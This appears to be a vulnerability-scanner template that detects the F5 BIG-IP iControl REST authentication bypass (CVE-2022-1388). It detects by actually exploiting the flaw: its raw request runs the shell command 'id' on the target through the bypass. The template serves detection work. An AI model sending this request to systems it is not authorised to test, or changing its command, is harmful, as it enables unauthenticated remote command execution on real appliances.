id: cve-2022-1388

info:
  name: F5 BIG-IP iControl REST Auth Bypass (CVE-2022-1388)
  author: moriarty
  severity: critical
  description: Detects F5 BIG-IP appliances vulnerable to iControl REST authentication bypass
  tags: cve,f5,auth-bypass

requests:
  - raw:
      - |
          POST /mgmt/tm/util/bash HTTP/1.1
          Host: {{Hostname}}
          Connection: keep-alive, x-F5-auth-token
          x-F5-auth-token: a
          Authorization: Basic Zm9vOmJhcg==
          Content-Type: application/json
          Content-Length: 37

          {"command":"run","utilCmdArgs":"-c id"}
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
          - 401
      - type: word
        words:
          - "commandResult"
          - "utilCmdArgs"
        condition: or
      - type: dsl
        dsl:
          - "contains(body, 'uid=')"
    stop-at-first-match: true
